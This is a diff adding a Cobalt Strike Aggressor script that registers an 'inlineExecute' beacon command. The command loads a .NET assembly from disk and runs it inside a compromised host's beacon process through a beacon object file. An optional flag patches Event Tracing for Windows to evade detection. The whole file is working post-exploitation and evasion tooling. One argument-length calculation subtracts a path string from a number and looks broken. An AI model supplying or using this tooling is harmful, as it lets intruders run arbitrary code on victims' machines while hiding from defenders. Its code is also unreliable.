@@ -1,0 +1,67 @@
+# inlineExecute.cna
+
+$help = "Usage: inlineExecute [-etw] [-verbose] <filepath> <args>"; 
+
+beacon_command_register(
+	"inlineExecute",
+	"execute-assembly in the current process with ETW bypass",
+	$help
+);
+
+alias inlineExecute {
+	$command = "inlineExecute";
+	$commandLength = &strlen($command);
+	
+	$data = substr($0, $commandLength + 1); # +1 to include a " " space
+	$dataLength = &strlen($data);
+	
+	local('$bid $filepath $bof_args')
+	
+	@args = split(' ', $data);
+	
+	$patchEtw = false;
+	$verbose = false;
+	for ($i = 0; $i < size(@args); $i++) {
+		if (@args[$i] iswm "-etw") {
+			$patchEtw = true;
+			
+		} else if (@args[$i] iswm "-verbose") {
+			$verbose = true;
+			
+		} else {
+			$filepath = @args[$i];
+			break;
+		}
+	}
+	
+	$filepathLength = &strlen($filepath);
+	if ($filepathLength == 0) {
+		blog($1, $help);
+		return;
+	}
+	
+	$handle = openf(script_resource("inlineExecute.o"));
+	$bof = readb($handle, -1);
+	
+	$assemblyHandle = openf($filepath);
+	$assemblyLength = lof($filepath);
+	$assemblyBytes = readb($assemblyHandle, -1);
+	
+	$assemblyArgs = "";
+	if (size(@args) > ($i + 1)) {
+		$filepathIndex = &indexOf($data, $filepath);
+		$assemblyArgs = substr($data, $filepathIndex + $filepathLength + 1, $dataLength - ($filepath));
+	}
+	
+	blog($1, "Executing: " . $filepath);
+	blog($1, "Arguments: " . $assemblyArgs);
+	
+	if (!-exists $filepath || !-isFile $filepath) {
+		blog($1, "File \"".$filepath."\" doesn't exist\n");
+		return;
+	}
+	
+	$bof_args = bof_pack($1, "bizii", $assemblyBytes, $assemblyLength, $assemblyArgs, $patchEtw, $verbose);
+	
+	beacon_inline_execute($1, $bof, "go", $bof_args);
+}
